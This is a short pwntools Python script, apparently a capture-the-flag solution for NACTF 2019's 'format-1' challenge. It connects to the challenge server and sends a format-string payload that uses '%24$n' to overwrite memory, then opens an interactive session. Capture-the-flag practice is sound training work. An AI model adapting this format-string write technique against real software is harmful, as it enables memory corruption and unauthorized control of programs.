from pwn import *
from fmtstr import FormatString

offset = 24
elf = ELF('./format-1')
# p = process('./format-1')
p = remote('shell.2019.nactf.com', 31560)
payload = 'AAAA.%36x.%'+str(offset)+'$n' # offset input = 4, jarak dari arg ke input = 0x50
p.sendline(payload)
p.interactive()